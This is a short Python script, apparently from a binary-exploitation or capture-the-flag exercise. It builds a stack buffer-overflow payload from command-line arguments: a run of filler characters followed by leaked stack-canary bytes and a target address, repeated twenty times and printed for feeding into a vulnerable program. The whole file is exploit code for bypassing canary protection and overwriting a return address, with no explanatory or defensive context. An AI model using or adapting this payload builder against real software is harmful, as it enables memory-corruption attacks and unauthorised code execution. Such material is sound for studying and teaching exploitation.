
from sys import argv

canary_bytes = argv[1] + '='  # argv[1] has the 3 *first* bytes of the canary (not the 0x00 one)
address = argv[2]
dummy_chars = argv[3]

load = canary_bytes + address;
payload = 'h' * int(dummy_chars) + 20 * load
print(payload)
